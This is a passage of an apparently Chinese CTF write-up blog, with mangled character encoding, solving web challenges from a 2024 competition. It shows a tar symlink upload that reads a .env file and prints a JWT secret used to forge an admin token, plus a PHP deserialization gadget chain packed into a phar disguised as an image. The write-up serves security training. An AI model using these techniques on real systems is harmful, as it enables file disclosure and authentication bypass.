class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Server started on http://localhost:80"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ åŠŸèƒ½æ˜¯ä¸Šä¼ ä¸€ä¸ªtaråŒ…å¹¶è§£å‹</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">const</span> <span class="token punctuation">(</span>uploadDir    <span class="token operator">=</span> <span class="token string">"./assets/uploads"</span>extractedDir <span class="token operator">=</span> <span class="token string">"./assets/extracted"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ ç›®å½•å’Œè§£å‹ç›®å½•</p><p>æ€è·¯åº”è¯¥æ˜¯å…ˆè·å– .env çš„ jwt_keyï¼Œç„¶åä¼ªé€ æˆadminä¸‹è½½flag</p><p>æ€è€ƒ html&#x2F;template çš„ sstiï¼Œä½†æ˜¯æ²¡æœ‰æ³¨å…¥ç‚¹</p><p>é‚£å°±æ–‡ä»¶ä¸Šä¼ ï¼Œå¥‡æ€ªçš„æ˜¯æˆ‘ç”¨linuxå‹ç¼©çš„tarå…¨éƒ¨è§£å‹å¤±è´¥ï¼ŒåŸæ¥æ˜¯å¤šåŠ äº†ä¸ª z å‚æ•°ï¼ˆ</p><p>å°è¯•åœ¨ windows è¿™é‡Œå‹ç¼©ä¸€ä¸ªtaråŒ…ï¼Œå‘ç°èƒ½ä¸Šä¼ è§£å‹äº†ï¼Œä½†æ˜¯ä¸‹è½½å…¨éƒ¨å¤±è´¥</p><p>æœ¬åœ°è°ƒè¯•ä¸€ä¸‹ï¼Œæˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶æ—¶ä¼šæ‰§è¡Œè¿™æ ·ä¸€æ¡sqliteè¯­å¥</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;users&#96; WHERE &#96;users&#96;.&#96;id&#96; &#x3D; 2 AND &#96;users&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;users&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸‹è½½æ—¶ç‚¹å‡»æ–‡ä»¶æ‰§è¡Œçš„urlï¼š<code>download/1/.env</code>ï¼Œå…¶sqlè¯­å¥æ˜¯</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;files&#96; WHERE (id &#x3D; &quot;1&#x2F;.env&quot; AND user_id &#x3D; 1) AND &#96;files&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;files&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>1/.env</code>è¿™ç©æ„åœ¨ id ä¸Šæ˜æ˜¾æ˜¯è¿”å› false</p><p>é‚£ä¹ˆè¿™é‡Œè¯´ä¸å®šèƒ½æ„é€ sqlæ³¨å…¥ï¼Œè¯•äº†ä¸€ä¸‹å‘ç°<code>&quot;</code>ä¼šè‡ªåŠ¨è¡¥æˆå¯¹</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;files&#96; WHERE (id &#x3D; &quot;&quot;&quot;)or+select+1--&quot; AND user_id &#x3D; 1) AND &#96;files&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;files&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é‚æ”¾å¼ƒ</p><p>è§‚å¯Ÿä¸‹ç™»å½•æ¥å£å¤„çš„æ“ä½œï¼š</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">result <span class="token operator">:=</span> db<span class="token punctuation">.</span>DB<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token string">"username = ?"</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM &#96;users&#96; WHERE username &#x3D; &quot;123&quot;&quot;)))--&quot; AND &#96;users&#96;.&#96;deleted_at&#96; IS NULL ORDER BY &#96;users&#96;.&#96;id&#96; LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿæ˜¯æ²¡æ³•æ³¨å…¥çš„ï¼Œäºæ˜¯æ³¨å…¥ä¼¼äº†</p><p>å°è¯•è½¯é“¾æ¥åˆ° .envï¼Œä½†æ˜¯è§£å‹å°±æŠ¥é”™<code>Failed to extract file: symlink /app/.env assets/extracted/2: file exists</code>äº†ï¼Œä¸æ‡‚</p><br><p>åŸæ¥æ˜¯å› ä¸ºè½¯é“¾æ¥éœ€è¦å…ˆå¥—ä¸€å±‚æ–‡ä»¶å¤¹å†ä¸Šä¼ ï¼Œå¦åˆ™è¿™é‡Œ assets&#x2F;extracted&#x2F;2 å°±ç›´æ¥æŒ‡å‘ &#x2F;app&#x2F;.env äº†</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token function">ln</span><span class="token builtin class-name">cd</span> <span class="token function">ln</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> /app/.env <span class="token builtin class-name">test</span><span class="token function">tar</span> <span class="token parameter variable">-cvf</span> ln.tar <span class="token function">ln</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åè®¿é—®é™æ€ç›®å½• &#x2F;assets&#x2F;extracted&#x2F;2&#x2F;test å¾—åˆ° .env</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">JWT_SECRET</span><span class="token operator">=</span>SfaVqVGfLOKk7Gp912kPe0Li47AEQM4iYNbBx1WVrWA<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥ä¼ªé€ adminå³å¯ï¼Œæ³¨æ„ UserID ä¹Ÿè¦æ”¹æˆ 1</p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250117224334850.png" alt="image-20250117224334850"></p><p>è¯»flag</p><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250117224547947.png" alt="image-20250117224547947"></p><hr><h1 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h1><p>æ–‡ä»¶ä¸Šä¼ ï¼Œflagå°±åœ¨webç›®å½•ä¸‹ï¼Œå…ˆçœ‹ä¸Šä¼ è§„åˆ™</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//echo "&lt;h4>è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:" . "&lt;h4/>";</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç™½åå•ï¼Œç»“åˆé¢˜ç›®æè¿°å¯çŸ¥è¦ç”¨pharæ‰“</p><p>çœ‹ä¸€ä¸‹åˆ©ç”¨ç±»ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Chunqiu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é“¾å­ï¼š<code>Chunqiu::__destruct -&gt; Show::__toString -&gt; Test::__get -&gt; Test::get -&gt; Test::file_get</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Chunqiu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Chunqiu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250119114348505.png" alt="image-20250119114348505"></p><p>æ¥ä¸‹æ¥æ„é€ pharåŒ…</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Chunqiu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Chunqiu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token comment">// echo serialize($a);</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$payload</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ”¹ä¸ºpngåç¼€ï¼Œä¸Šä¼ </p><p>ç„¶åä¸Šä¼ åçš„æ–‡ä»¶åæ˜¯<code>md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;</code></p><p>ç»“æœè¿™ä¸ª<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>æ•´äº†åŠå¤©ä¹Ÿæ²¡ææ¸…æ¥šè·¯å¾„åœ¨å“ª</p><p>file.php å¯ä»¥ç›´æ¥è¯»æ–‡ä»¶ï¼Œwafå±ç”¨æ²¡æœ‰ï¼Œ<code>/file.php?file=/flag</code>éé¢„æœŸç§’äº†ï¼Œpharä¸ªé”¤å­</p><hr><h1 id="easy-code"><a href="#easy-code" class="headerlink" title="easy_code"></a>easy_code</h1><p>åŸºäºgetè¯·æ±‚å‚æ•°çš„2048</p><p>robots.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">User-agent: chunqiuDisallow: /gogogo.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>gogogo.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allowedFiles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'read.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ctfer</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfer'</span><span class="token punctuation">]</span><span class="token operator">??</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ctfer</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 0!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 1!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token operator">!=</span> <span class="token number">667</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 2!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//æº¢å‡º</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$ctfer</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'7'</span><span class="token punctuation">)</span><span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error 3!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 